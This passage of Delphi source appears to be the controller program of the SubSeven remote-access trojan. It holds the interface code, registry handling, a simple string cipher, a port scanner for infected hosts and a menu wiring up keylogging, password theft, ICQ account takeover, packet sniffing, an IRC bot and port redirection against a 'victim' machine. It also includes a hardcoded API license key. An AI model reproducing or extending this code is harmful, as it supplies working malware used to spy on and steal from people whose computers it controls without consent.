    procedure OutlookBtn91Click(Sender: TObject);
  private
    { Private declarations }
    MouseDownSpot : TPoint;
    Capturing : bool;
    LinkToBanner:String;
    procedure Disconnected;
    function SendSettings: string;
    procedure SendMousePos(x, y: Integer);
    procedure DataReceived(data: string);
    procedure LoadSettings;
    procedure SaveRegSettings;
    function CountFeatures: integer;
    procedure FlatCheckBox1ClickIT;
    procedure SaveIT(f: TForm; une: integer);
    procedure CheckSpies(filename: string);
    procedure LoadHTML(care: integer;add:bool);
    procedure SetStatus;
    procedure DeCompressFile(filename: string);
    procedure DeCompressNewFile(filename, fn2: string);
    function CurentNum: integer;
    procedure LoadRASPasswords;
    procedure CloseRAS(Sender: TObject);
    procedure InstallICQDatabase(FromFile: String);
    procedure CheckBetaStuff;
//    procedure InstallBack;
    procedure SaveColors;
  public
    { Public declarations }

{S.K.I.N.}
    bit_window,bit_button,bit_btn_fill,bit_close_btn,bit_ip_btn,bit_min_btn,bit_main,bit_con_btn,bit_ping_btn,bit_dis_btn,bit_background:TBitmap;
    SkinDescription:string;
    BackgroundColor:TColor;
    ButtonFontName:String;
    ButtonFontSize:Byte;
    ButtonFontAttr:String;

    UseMySettings:Boolean;
    NickName:String;
    MouseHook:HHook;
    MouseMsg:TNMMsg;
    SpyFormName:array[1..20] of string;
    SpyFormName2:array[1..20] of string;
    CeSaTrimita:String;
    r:TRect;
    Connected:Boolean;
    DriversLoaded, Transferand:Boolean;
    DownloadingFile,KeepConnectedIP:String;
    DoEditFile:boolean;
    EditFromFile:String;
    EditToFile:String;
    function Decrypt2(ce: string): string;
    procedure RunEditServer;
    procedure WaitFor(msecs: integer);
    procedure DoneEditing;
    procedure WriteKey(sProgTitle, SCmdLine: string);
    function ReadKey(Section: String): String;
    function AreYouSure(request: string): boolean;
    procedure SendCommand(c, m, v: string);
    procedure StartAnimation;
    procedure StopAnimation;
    procedure ShowMsg(ce: String);
    procedure StartTheLogger;
    procedure StopTheLogger;
    function NotPassedVersionCheck(serverreq:string):boolean;
    function DownloadFolder: string;
    procedure HandleErrors(Sender:TObject;E:Exception);
    function FalDe(ce:string;cat:integer):string;
    procedure InitiateTransfer;
    procedure MinimizeIT(Sender:TObject);
    function GetUINIP(uin: string): String;
    function LoadSkin(folder: string): boolean;
  end;


type trj= record
     name : string;
     port : string;
     end;
const max_hunters=60;
      eol=#13#10;
var
  i,j,k      : integer;
  hunters           : array[1..max_hunters+5] of TWSocket;
  huntpos           : array[1..max_hunters+5] of integer;
  s,iplow           : string;
  cpos              : integer;
  gata,over         : boolean;
  cip               : integer;
  delay             : integer;
  startip,endip     : integer;
  ports: array[0..300] of trj;
  cport             : string;
  last_pos          : integer;
  how_long          : integer;
  dirx       : string;
  no_need    : boolean;
  x1,x2,x3,y1,y2,y3 : integer;
  q1,q2,q3  : integer;
  sx1,sx2,sx3 : string;
  more_visible : boolean;
  read_path    : boolean;
  err_val      : boolean;


const
  gatafacut:bool=false;
  htCaptionBtn = htSizeLast + 1;
  TastePrimite:string='';
  MainPass=5075579;
  AlreadyDone:boolean=False;
  ClientVersion='2.1';
  StringClientVersion='2.1 [special edition]';
  NotConnected='you''re not connected.';
  KeysToSend:string='';
  RegDir='SOFTWARE\SubSeven';
  DedicatedTo='‹œ˜§US˜˜©šžd¡Ÿš š';
  InTheTransfer:boolean=False;
  Tine:boolean=False;
  SpyNo=4;
  SpyPort:string='32992';
  KeyzPort:string='2773';
  MatrixPort:string='7215';
var
  receivingmsg:bool;
  PassKeptFor,PassKeptData:String;
  MainForm: TMainForm;
  MyTime:TSystemTime;
  Spies:array[1..SpyNo] of bool;
  Time_a,Time_b,time_:TDateTime;
  h_,m_,s_,ss_:word;
  CIcon:Integer=0;
  IconConst : array [0..4] of integer=(0, MB_ICONEXCLAMATION,MB_ICONINFORMATION, MB_ICONSTOP,  MB_ICONQUESTION);
  sending:boolean;
  transferand:boolean;
  Buffer: array [0..1024] of Char;
  ServerVersion:String;
  ServerAnswer,Connected:Boolean;
  fisier:file;
  Refreshing,GetDrives,RECORDING,iale,Conectat,Done,InChat,Downloading,GettinInfo,Gettin:Boolean;
  CurrentHost:Integer;
  primiti,total,marime:Integer;
  InFile:Byte;
  ss:TFileStream;
  ListIndex:LongInt;
  MyStream:TMemoryStream;
  CaptureSize,atprogress,tmpint:LongInt;
  IsGetKeys,MouseOFF,getkeylog,ftpactive,Transfering,InTransfer:Boolean;
  StrmSaved:TStream;
  TinePass:String;
implementation

uses AnimUnit, KeyLoggerUnit, showmessageunit, DispInfoUnit,
  MessageUnit, ClientChatUnit, VictimChatUnit, FindFilesUnit, PassUnit,
  RegEditUnit, MMSystem, ICQunit, nonstopUnit, ShowImgUnit, webcamUnit,
  winmUnit, FileMunit, GetPathUnit, Registry, ShellApi, LZExpand, PopUpUnit,
  ShortcutUnit, msnUnit, aimUnit, TheMatrixUnit, htmltotxt,
  AboutUnit, iptoolUnit, procUnit, AddPortUnit, AddressBookUnit, ICQAPICalls, ICQAPIData, WinSock,
  BookMarkUnit, SniffLogUnit, introunit;

var
  SpyFormMSN:array[1..20] of TmsnForm;
  SpyFormAIM:array[1..20] of TaimForm;
  ras:TDispInfo;
{$R *.DFM}

function TMainForm.LoadSkin(folder: string): boolean;
function IsSkinFile(f:string):bool;
begin
 if not FileExists(f) then
  begin
   Result:=False;
   ShowMsg('can''t find '+ExtractFileName(f));
  end else Result:=True;
end;
var DefCon,DefPin:bool;
    ini:TIniFile;
    SearchRec:TSearchRec;
    Name,FOT:String;
begin

 ButtonFontName:='';
 ButtonFontSize:=0;
 ButtonFontAttr:='';
 BackgroundColor:=clBlack;

if (folder<>'default') then
begin
 if folder[length(folder)]<>'\' then folder:=folder+'\';
 if FindFirst(folder+'*.ttf',faAnyFile,SearchRec)=0 then
  repeat
   name:=SearchRec.Name;
   name:=folder+name;
   fot:=copy(name,1,length(name)-3)+'fot';
   fot:=fot+#0;
   name:=name+#0;
   CreateScalableFontResource(0,@fot[1],@name[1],nil);
   if AddFontResource(@fot[1])=0 then ShowMsg('error loading font '+name);
   SendMessage( HWND_BROADCAST, WM_FONTCHANGE, 0, 0 );
//   showmessage('installing '+name);
  until FindNext(SearchRec)>0;
 if folder[length(folder)]<>'\' then folder:=folder+'\';
 Result:=False;
 if not IsSkinFile(folder+'window.bmp') then exit;
 if not IsSkinFile(folder+'button.bmp') then exit;
 if not IsSkinFile(folder+'btn_fill.bmp') then exit;
 if not IsSkinFile(folder+'close_btn.bmp') then exit;
 if not IsSkinFile(folder+'ip_btn.bmp') then exit;
 if not IsSkinFile(folder+'min_btn.bmp') then exit;
 if not IsSkinFile(folder+'main.bmp') then exit;
 DefCon:=False;
 DefPin:=False;
 if not FileExists(folder+'con_btn.bmp') or
    not FileExists(folder+'dis_btn.bmp') then DefCon:=True;
 if not FileExists(folder+'ping_btn.bmp') then DefPin:=True;
 Result:=True;
 bit_window   .LoadFromFile(folder+'window.bmp');
 bit_button   .LoadFromFile(folder+'button.bmp');
 bit_btn_fill .LoadFromFile(folder+'btn_fill.bmp');
 bit_close_btn.LoadFromFile(folder+'close_btn.bmp');
 bit_ip_btn.LoadFromFile(folder+'ip_btn.bmp');
 bit_min_btn.LoadFromFile(folder+'min_btn.bmp');
 bit_main.LoadFromFile(folder+'main.bmp');
 if not DefCon then bit_con_btn.LoadFromFile(folder+'con_btn.bmp');
 if not DefCon then bit_dis_btn.LoadFromFile(folder+'dis_btn.bmp');
 if not DefPin then bit_ping_btn.LoadFromFile(folder+'ping_btn.bmp');
 try
 Ini := TIniFile.Create(folder+'skin.ini');
 BackgroundColor:=StringToColor(ini.ReadString('skin info', 'BackgroundColor', 'clBlack'));
 cButtonText:=StringToColor(ini.ReadString('skin info', 'ButtonFontColor', 'clWhite'));
 ButtonFontName:=ini.ReadString('skin info', 'ButtonFontName', '');
 ButtonFontSize:=ini.ReadInteger('skin info', 'ButtonFontSize', 0);
 ButtonFontAttr:=ini.ReadString('skin info', 'ButtonFontAttr', '0000');
 SkinDescription:=ini.ReadString('skin info','SkinDescription','none');

 cFormBackground:=BackgroundColor;
 cFormLine:=StringToColor(ini.ReadString('skin info', 'WindowLineColor', ColorToString(cFormLine)));
 cFormForeground:=StringToColor(ini.ReadString('skin info', 'WindowForegroundColor', ColorToString(cFormForeground)));
 cFormCaption:=cFormForeground;
 cFormText:=StringToColor(ini.ReadString('skin info', 'WindowTextColor', ColorToString(cFormText)));

 cMenuBackground:=StringToColor(ini.ReadString('menu info','MenuBackground',ColorToString(cMenuBackground)));
 cMenuPageNormalText:=StringToColor(ini.ReadString('menu info','MenuPageText',ColorToString(cMenuPageNormalText)));
 cMenuPageNormalBorder:=StringToColor(ini.ReadString('menu info','MenuPageBorder',ColorToString(cMenuPageNormalBorder)));
 cMenuPageSelectedBorder:=StringToColor(ini.ReadString('menu info','MenuPageBorderSelected',ColorToString(cMenuPageSelectedBorder)));
 cMenuItemNormalText:=StringToColor(ini.ReadString('menu info','MenuItemColor',ColorToString(cMenuItemNormalText)));
 cMenuItemNormalBorder:=StringToColor(ini.ReadString('menu info','MenuItemSelected',ColorToString(cMenuItemNormalBorder)));
 cMenuItemSelectedText:=StringToColor(ini.ReadString('menu info','MenuItemOutline',ColorToString(cMenuItemSelectedText)));
 cMenuArrows:=StringToColor(ini.ReadString('menu info','MenuArrows',ColorToString(cMenuArrows)));

 Ini.Free;
 except end;
end else
begin
 DefCon:=True;
 DefPin:=True;
 bit_window.LoadFromResourceName(HInstance,'window');
 bit_button.LoadFromResourceName(HInstance,'button');
 bit_btn_fill.LoadFromResourceName(HInstance,'btn_fill');
 bit_close_btn.LoadFromResourceName(HInstance,'close_btn');
 bit_ip_btn.LoadFromResourceName(HInstance,'ip_btn');
 bit_min_btn.LoadFromResourceName(HInstance,'min_btn');
 bit_main.LoadFromResourceName(HInstance,'main');

 ButtonFontName:=ReadKey('skin_fontname');
 ButtonFontAttr:=ReadKey('skin_fontattr');if length(ButtonFontAttr)<>4 then ButtonFontAttr:='0000';
 ButtonFontSize:=StrToIntDef(ReadKey('skin_fontsize'),0);

end;

// BackgroundColor:=clYellow;

 SetTheColors;
 CloseButton.Glyph.Assign(bit_close_btn);
 IPToolButton.Glyph.Assign(bit_ip_btn);
 MinimizeButton.Glyph.Assign(bit_min_btn);

 if not DefCon then
  begin
   ConnectButton.Visible:=False;
   ConnectBtn.Visible:=True;
   ConnectBtn.Glyph.Assign(bit_con_btn);
  end else
  begin
   ConnectButton.Visible:=True;
   ConnectBtn.Visible:=False;
  end;

 if not DefPin then
  begin
   OutlookBtn95.Visible:=False;
   FlatSpeedButton10.Visible:=True;
   FlatSpeedButton10.Glyph.Assign(bit_ping_btn);
  end else
  begin
   OutlookBtn95.Visible:=True;
   FlatSpeedButton10.Visible:=False;
  end;
  
 MainImg.Picture.Bitmap.Assign(bit_main);

 Invalidate;
end;

function iptostring(ip_address:longint):string;
begin
  ip_address:=winsock.ntohl(ip_address);
  result:= inttostr(ip_address shr 24)+'.'+
           inttostr((ip_address shr 16) and $ff)+'.'+
           inttostr((ip_address shr 8) and $ff)+'.'+
           inttostr(ip_address and $ff);
end;

function TMainForm.GetUINIP(uin:string):String;
var usir:^TBSICQAPI_User;
    b:bool;
    iV:Integer;
begin
 result:='0.0.0.0';
 iV:=65537;
 if (not ICQAPICall_SetLicenseKey(PChar('none'),PChar('mobman77'),PChar('3AAD67AA02AAC1BA'))) then exit;
try
 New(Usir);
 Usir^.m_iUIN:=strtoint(UIN);Usir^.m_iIP:=0;
 b:=ICQAPICall_GetVersion(iV);
 try b:=ICQAPICall_GetFullUserData(Usir,iV);except result:='0.0.0.0';end;
 if b then Result:=IPToString(Usir.m_iIP) else Result:='0.0.0.0';
 ICQAPIUtil_FreeUser(Usir);
 Dispose(Usir);
except end;
end;

procedure TMainForm.DeCompressFile(filename:string);
var zip:TZLBArchive;
    b:bool;
    AName:String;
    df:string;
begin
 if ServerVersion[1]<>'2' then Exit;
 try
 df:=DownloadFolder;
 AName:=df+'~temp.tmp';
 if FileExists(AName) then DeleteFile(AName);
 CopyFile(PChar(FileName),PChar(AName),false);
 DeleteFile(FileName);
 zip:=TZLBArchive.Create(self);
 zip.OpenArchive(AName);
 zip.ExtractFileByName(df,ExtractFileName(FileName));
 zip.CloseArchive;
 zip.Free;
 DeleteFile(AName);
 except end;
end;

procedure TMainForm.DeCompressNewFile(filename,fn2:string);
var zip:TZLBArchive;
    b:bool;
    AName:String;
    df:string;
begin
 df:=DownloadFolder;
 AName:=df+'ZRCHMTA.SSA';
 if FileExists(AName) then DeleteFile(AName);
 CopyFile(PChar(FileName),PChar(AName),false);
 DeleteFile(FileName);
 zip:=TZLBArchive.Create(self);
 zip.OpenArchive(AName);
 zip.ExtractFileByName(df,fn2);
 zip.CloseArchive;
 zip.Free;
 CopyFile(PChar(df+fn2),PChar(FileName),b);
 DeleteFile(AName);
 DeleteFile(df+fn2);
end;

function Decrypt(ce:string):string;var x,i:Integer;Text,PW:String;
begin
 if ce='' then begin result:='';exit;end;
 Text:=ce;  PW:=IntToStr(MainPass);  x:=0; // initialize count
 for i:=0 to length(Text) do begin Text[i]:=Chr(Ord(Text[i])-Ord(PW[x]));
 Inc(x);if x=(length(PW)-1)then x:=0;end;Result:=Text;
end;

function TMainForm.Decrypt2(ce:string):string;
begin
 Result:=Decrypt(ce);
end;

function Encrypt(ce:string):string;var x,i:Integer;Text,PW:String;
begin
 if ce='' then begin result:='';exit;end;
 Text:=ce;PW:=IntToStr(MainPass);x:=0; // initialize count
 for i:=0 to length(text) do begin Text[i]:=Chr(Ord(Text[i])+Ord(PW[x]));Inc(x);
 if x=(length(PW)-1)then x:=0;end;Result:=Text;
end;

procedure TMainForm.WriteKey(sProgTitle,SCmdLine:string);
var sKey:String;
    reg:TRegIniFile;
begin
 sKey:='';
 reg:=TRegIniFile.Create('');
 reg.RootKey:=HKEY_LOCAL_MACHINE;
 reg.WriteString(RegDir
                +sKey+#0,sProgTitle,sCmdLine);
 reg.Free;
end;
function TMainForm.ReadKey(Section:String):String;
var Reg:TRegistry;
    MySerial:String;
begin
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_LOCAL_MACHINE;
  if OpenKey(RegDir,false) then
   try
    MySerial:=ReadString(Section);
   except
    MySerial:='';
   end;
   Free;
  end;
Result:=MySerial;
end;


function TMainForm.FalDe;
begin
 case cat of
  2:begin
     if (length(ce)<10) then result:='0'+IntToStr(length(ce)) else Result:=IntToStr(Length(ce));
    end;
  3:begin
     if (length(ce)<10) then result:='00'+IntToStr(length(ce)) else
      if (length(ce)<100) then result:='0'+IntToStr(length(ce)) else
       Result:=IntToStr(Length(ce));
    end;
 end;
end;

function TMainForm.AreYouSure(request:string):boolean;
var Str:String;
begin
 GetTextForm.OutlookBtn1.Caption:='yeah';
 GetTextForm.OutlookBtn2.Caption:='hell no';
 GetTextForm.EditBox.Visible:=False;
 GetTextForm.TitleLabel.Alignment:=taCenter;
 GetTextForm.GetText('',request,'a',false,Str);
 if Str<>'' then result:=true else result:=false;
 GetTextForm.TitleLabel.Alignment:=taLeftJustify;
 GetTextForm.OutlookBtn1.Caption:='ok';
 GetTextForm.OutlookBtn2.Caption:='cancel';
 GetTextForm.EditBox.Visible:=True;
end;

function TMainForm.NotPassedVersionCheck(serverreq:string):boolean;
var doesntwork:boolean;
    bitcur,bitreq:array[1..2] of byte;
    shwmsg:string;
begin
NotPassedVersionCheck:=false;
bitcur[1]:=StrToInt(copy(ServerVersion,1,1));
bitcur[2]:=StrToInt(copy(ServerVersion,3,1));
bitreq[1]:=StrToInt(copy(Serverreq,1,1));
bitreq[2]:=StrToInt(copy(Serverreq,3,1));
doesntwork:=false;
if (bitcur[2]<bitreq[2]) and (bitcur[1]<=bitreq[1]) then doesntwork:=true;
if (bitcur[1]<bitreq[1]) then doesntwork:=true;

if doesntwork then
 begin
  shwmsg:='the server needs to be updated to version: '+serverreq+' before using that feature. the current version of the server is: '+ServerVersion;
  if ServerVersion='1.0' then shwmsg:=shwmsg+' or 1.1';
  ShowMsg(shwmsg);
  NotPassedVersionCheck:=true;
 end;
end;

procedure TMainForm.HandleErrors;
begin
{}
end;

function Merge(x,y,x1,y1,x2,y2:integer):Boolean;
begin
 if ((x>=x1) and (x<=x2)) and ((y>=y1) and (y<=y2)) then result:=true else result:=false;
end;

{procedure TMainForm.WMNCHitText(var Msg:TWMNCHitTest);
const Corner=5;
      OffSet=3;
begin
  inherited;
 with MainForm,msg do begin
  if (Merge(xpos,ypos ,Left+CaptionLabel.Left,Top+CaptionLabel.Top,Left+CaptionLabel.Left+CaptionLabel.Width,Top+CaptionLabel.Top+CaptionLabel.Height)) then exit;
 end;
 if (Msg.Result = HTCLIENT) then
  with MainForm,msg do begin
  if (Merge(xpos,ypos ,Left         ,top+Corner        ,left+Offset       ,top+height-Corner)) then Result := htLeft;
  if (Merge(xpos,ypos ,Left+width-Offset ,top+Corner        ,left+width   ,top+height-Corner)) then Result := htRight;
  if (Merge(xpos,ypos ,Left+Corner       ,top          ,left+width-Corner ,top+Offset       )) then Result := htTop;
  if (Merge(xpos,ypos ,Left+Corner       ,top+height-Offset ,left+width-Corner ,top+height  )) then Result := htBottom;
  if (Merge(xpos,ypos ,Left,Top,Left+Corner,Top+Corner)) then Result:=htTopLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top,Left+Width,Top+Corner)) then Result:=htTopRight;
  if (Merge(xpos,ypos ,Left,Top+Height-Corner,Left+Corner,Top+Height)) then REsult:=htBottomLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top+Height-Corner,Left+Width,Top+Height)) then Result:=htBottomRight;
  if (Merge(xpos,ypos ,Left+CaptionLabel.Left,Top+CaptionLabel.Top,Left+CaptionLabel.Left+CaptionLabel.Width,Top+CaptionLabel.Top+CaptionLabel.Height)) then Result:=htCaption;
 end;
end;}

procedure TMainForm.MenuChangeClick(Sender: TObject);
var tmpint:integer;
begin
// Tipar.Show;
{ ArrowButton.ImageIndex:=-ArrowButton.ImageIndex+1;
 OutBar.Visible:=Not OutBar.Visible;
 if OutBar.Visible then tmpint:=+111 else tmpint:=-111;
 Panel3.Left:=Panel3.Left+tmpint;
 Panel3.Width:=Panel3.Width-tmpint;
 StatusBar.Panels[1].Enabled:=not StatusBar.Panels[1].Enabled;
 Timer1.Enabled:=not StatusBar.Panels[1].Enabled;
{ Shape5.Visible:=not Shape5.Visible;}
{ ProgBar.Visible:=Not ProgBar.Visible;}
end;

procedure TMainForm.miDeletePageClick(Sender: TObject);
begin
 if OutBar.CurrentPage.Count=0 then
  begin
   if (Assigned(OutBar.CurrentPage)) and (AreYouSure('delete page?')) then
    OutBar.CurrentPage.Free;
  end else showmsg('can''t delete page! it still contains items. move the items first, then delete it.');
end;

procedure TMainForm.PopupMenu1Popup(Sender: TObject);
begin
 miDeletePage.Enabled := Assigned(OutBar.CurrentPage);
 miChangePage.Enabled := Assigned(OutBar.CurrentPage);
try miChangeItem.Enabled := Assigned(OutBar.CurrentPage.ItemSelected);
 except miChangeItem.Enabled:=false;end;
end;

procedure TMainForm.miChangePageClick(Sender: TObject);
var str:String;
begin
 if Assigned(OutBar.CurrentPage) then
  begin
   GetTextForm.GetText('change page name','enter new name:',OutBar.CurrentPage.Caption,false,str);
   if str<>'' then OutBar.CurrentPage.Caption:=str;
   OutBar.Invalidate;
  end;
end;

procedure TMainForm.miChangeItemClick(Sender: TObject);
var strtmp,instr,icstr:string;
begin
 if Assigned(OutBar.CurrentPage.ItemSelected) then
  begin
   instr:=copy(OutBar.CurrentPage.ItemSelected.Caption,1,length(OutBar.CurrentPage.ItemSelected.Caption)-6);
   icstr:=copy(OutBar.CurrentPage.ItemSelected.Caption,length(OutBar.CurrentPage.ItemSelected.Caption)-5,6);
   GetTextForm.GetText('change item name','enter new name:',instr,false,strtmp);
   if strtmp<>'' then OutBar.CurrentPage.ItemSelected.Caption:=strtmp+icstr;
   OutBar.Invalidate;
  end;
end;

procedure TMainForm.miAddPageClick(Sender: TObject);
var aPage:TOutPage;
    strtmp:string;
begin
 GetTextForm.GetText('add new page','enter page name:','<new page>',false,strtmp);
 if strtmp='' then exit;
 aPage := OutBar.Pages.Add;
 with aPage do
    Caption := strtmp;
  OutBar.CurrentPage := aPage;
end;

procedure TMainForm.OutlookBtn5Click(Sender: TObject);
begin
 if Conectat then begin
 if NotPassedVersionCheck('1.2') then exit;
  ClientSocket.Socket.SendText('GMI');
  Status.Caption:='receiving computer information...';
  StartAnimation;
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutBarClick(Sender: TObject);
var care:String;
begin
 care:=Copy(OutBar.CurrentItem.Caption,length(OutBar.CurrentItem.Caption)-5,6);

 if Care='@01:01' then _Pagini.ActivePage:=pScanner;
 if Care='@01:02' then _Pagini.ActivePage:=pGetMoreInfo;
 if care='@01:03' then _Pagini.ActivePage:=pServerOptions;
 if care='@01:04' then _Pagini.ActivePage:=pNotify;
 if care='@01:05' then _Pagini.ActivePage:=pHomeInfo;
{ if care='@01:06' then _Pagini.ActivePage:=pUtils;}

 if Care='@02:01' then _Pagini.ActivePage:=pKeyboard;
 if Care='@02:02' then _Pagini.ActivePage:=pChat;
 if Care='@02:03' then _Pagini.ActivePage:=pMsgManager;
 if Care='@02:04' then _Pagini.ActivePage:=pSpy;
 if Care='@02:05' then _Pagini.ActivePage:=pMatrix;
 if Care='@02:06' then _Pagini.ActivePage:=pICQTakeover;

 if Care='@03:01' then _Pagini.ActivePage:=pFTP;
 if Care='@03:02' then _Pagini.ActivePage:=pFindFiles;
 if Care='@03:03' then _Pagini.ActivePage:=pPasswords;
 if Care='@03:04' then _Pagini.ActivePage:=pRegEdit;
 if Care='@03:05' then _Pagini.ActivePage:=pAppRedirect;
 if Care='@03:06' then _Pagini.ActivePage:=pPortRedirect;
 if Care='@03:07' then _Pagini.ActivePage:=pIRCBot;

 if Care='@04:01' then Anim.Animeaza(fileM);
 if Care='@04:02' then Anim.Animeaza(winM);
 if Care='@04:03' then Anim.Animeaza(procM);
 if Care='@04:04' then _Pagini.ActivePage:=pSpeech;
 if Care='@04:05' then _Pagini.ActivePage:=pClipboard;
 if Care='@04:06' then _Pagini.ActivePage:=pSniff;

 if Care='@05:01' then _Pagini.ActivePage:=pSee;
 if Care='@05:02' then _Pagini.ActivePage:=pPrint;
 if Care='@05:03' then _Pagini.ActivePage:=pBrowser;
 if Care='@05:04' then _Pagini.ActivePage:=pRes;
 if Care='@05:05' then _Pagini.ActivePage:=pColors;
 if Care='@05:06' then _Pagini.ActivePage:=pFlip;

 if Care='@06:01' then _Pagini.ActivePage:=pRestart;
 if Care='@06:02' then _Pagini.ActivePage:=pMouse;
 if Care='@06:03' then _Pagini.ActivePage:=pSound;
 if Care='@06:04' then _Pagini.ActivePage:=pTimeDate;
 if Care='@06:05' then _Pagini.ActivePage:=pExtra;
 if Care='@06:06' then _Pagini.ActivePage:=pScreenSaver;

 if care='@07:01' then _Pagini.ActivePage:=pQuality;
 if care='@07:02' then _Pagini.ActivePage:=pLocalFolder;
 if care='@07:04' then _Pagini.ActivePage:=pMisc;
 if care='@07:05' then _Pagini.ActivePage:=pAdvanced;
 if care='@07:06' then RunEditServer;
 if care='@07:07' then _Pagini.ActivePage:=pSkins;
end;

procedure TMainForm.RunEditServer;
var path:string;
begin
 path:=ExtractFilePath(ParamStr(0));
 if (not FileExists(path+'EditServer.exe')) then
  ShowMsg(path+'EditServer.exe not found.')
 else WinExec(PChar(path+'EditServer.exe'),SW_SHOW);
end;

procedure TMainForm.CloseButtonClick(Sender: TObject);
begin
 close;
// halt;
end;

procedure TMainForm.savesettings1Click(Sender: TObject);
begin
 if Not SaveSettings.execute then Exit;
 with OutBar do Pages.SaveToFile(SaveSettings.FileName);
 WriteKey('settings_file',OpenSettings.FileName);SaveColors;
end;

procedure TMainForm.loadsettings1Click(Sender: TObject);
begin
 if Not OpenSettings.execute then Exit;
 with OutBar do
  begin
   Clear;
   Pages.LoadFromFile(OpenSettings.FileName);
  end;
 SetTheColors;SaveColors;
 WriteKey('settings_file',OpenSettings.FileName);
 case CountFeatures of
  29:begin
      OutBar.Pages.Add;
      OutBar.Pages[OutBar.Pages.Count-1].Caption:='[-new stuff-]';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[0].Caption:='get home info@01:05';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[1].Caption:='matrix@02:05';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[2].Caption:='app redirect@03:05';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[3].Caption:='screen saver@06:06';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[4].Caption:='advanced@07:05';
     end;
  34:begin
      OutBar.Pages.Add;
      OutBar.Pages[OutBar.Pages.Count-1].Caption:='[-new stuff-]';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[0].Caption:='ICQ takeover@02:06';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[1].Caption:='port redirect@03:06';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[2].Caption:='irc bot@03:07';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[3].Caption:='process manager@04:03';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[4].Caption:='text-2-speech@04:04';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[5].Caption:='clipboard manager@04:05';
      OutBar.Pages[OutBar.Pages.Count-1].Add;
      OutBar.Pages[OutBar.Pages.Count-1].Items[6].Caption:='run EditServer@07:06';
//      OutBar.Pages[OutBar.Pages.Count-1].Add;
//      OutBar.Pages[OutBar.Pages.Count-1].Items[7].Caption:='packet sniffer@04:06';
     end;
 end;
end;

procedure WriteTheDEFAULT;
var res:TResourceStream;
begin
 try DeleteFile(ExtractFilePath(ParamStr(0))+'DEFAULT.s7m');except end;
 res:=TResourceStream.Create(HInstance,'RCDATA_1',RT_RCDATA);
 res.SaveToFile(ExtractFilePath(ParamStr(0))+'DEFAULT.s7m');
 res.free;
end;

procedure WriteDLL;
var res:TResourceStream;
begin
 try DeleteFile(ExtractFilePath(ParamStr(0))+'syskey.dll');except end;
 res:=TResourceStream.Create(HInstance,'RCDATA_2',RT_RCDATA);
 res.SaveToFile(ExtractFilePath(ParamStr(0))+'syskey.dll');
 res.free;
end;

procedure TMainForm.SaveColors;
begin
{WriteKey('color1',ColorToString(cMenuBackground));
 WriteKey('color2',ColorToString(cMenuPageNormalText));
 WriteKey('color3',ColorToString(cMenuPageNormalBorder));
 WriteKey('color4',ColorToString(cMenuPageSelectedBorder));
 WriteKey('color5',ColorToString(cMenuItemNormalText));
 WriteKey('color6',ColorToString(cMenuItemNormalBorder));
 WriteKey('color7',ColorToString(cMenuItemSelectedText));
 WriteKey('color8',ColorToString(cMenuArrows));
 WriteKey('color9',ColorToString(cFormLine));
 WriteKey('color10',ColorToString(cFormBackGround));
 WriteKey('color11',ColorToString(cFormCaption));
 WriteKey('color12',ColorToString(cFormText));
 WriteKey('color13',ColorToString(cButtonText));
 WriteKey('color14',ColorToString(cButtonBorder));
 WriteKey('color15',ColorToString(cButtonOverFill));
 WriteKey('color16',ColorToString(cButtonClickFill));
 WriteKey('color17',ColorToString(cFormForeGround));}
end;

procedure TMainForm.SetTheColors;
var i:integer;
begin
try
 IdleLabel.Font.Color:=cFormText;
 IdleLabel.Color:=cFormBackground;
 progr.BackColor:=cFormBackground;
 progr.ForeColor:=cFormForeground;
 progr.Font.Color:=cFormText;
 progr.Color:=cFormText;
 pb.BackColor:=cFormForeground;
 pb.ForeColor:=cFormCaption;
 pb.Font.Color:=cFormText;
 pb.Color:=cFormText;
 MainForm.Color:=cFormBackground;
 Panel1.Color:=cFormBackGround;
 Color:=cFormBackGround;
 StatusBar.Color:=cFormBackground;
 StatusBar.Font.Color:=cFormText;
 StatusBar.Panels[0].GaugeAttrs.Color:=cFormCaption;
 ConnectPanel.Color:=cFormForeground;
 Shape1.Pen.Color:=cFormLine;
 Shape2.Pen.Color:=cFormLine;
 Shape3.Pen.Color:=cFormLine;
 Shape4.Pen.Color:=cFormLine;
 Shape6.Pen.Color:=cFormLine;
 Shape13.Pen.Color:=cFormLine;
 Shape14.Pen.Color:=cFormLine;
 Shape15.Pen.Color:=cFormLine;
 Shape16.Pen.Color:=cFormLine;
 Shape17.Pen.Color:=cFormLine;
 Shape18.Pen.Color:=cFormLine;
 Shape19.Pen.Color:=cFormLine;
 Shape20.Pen.Color:=cFormLine;
 OutLookBtn2.Invalidate; OutLookBtn3.Invalidate; OutLookBtn4.Invalidate;
 Shape10.Pen.Color:=cFormLine;Shape10.Brush.Color:=cFormBackGround;
 Shape11.Pen.Color:=cFormLine;Shape11.Brush.Color:=cFormBackGround;
 Shape12.Pen.Color:=cFormLine;Shape12.Brush.Color:=cFormBackGround;
 Status.Font.Color:=cFormText;
 CaptionLabel.Color:=cFormCaption;
 CaptionLabel.Font.Color:=cFormText;
 MainForm.Font.Color:=cFormText;
 OutBar.BackgroundColor:=cMenuBackground;
 Label1.Font.Color:=cFormText;
 Label2.Font.Color:=cFormText;
 Label3.Font.Color:=cFormText;
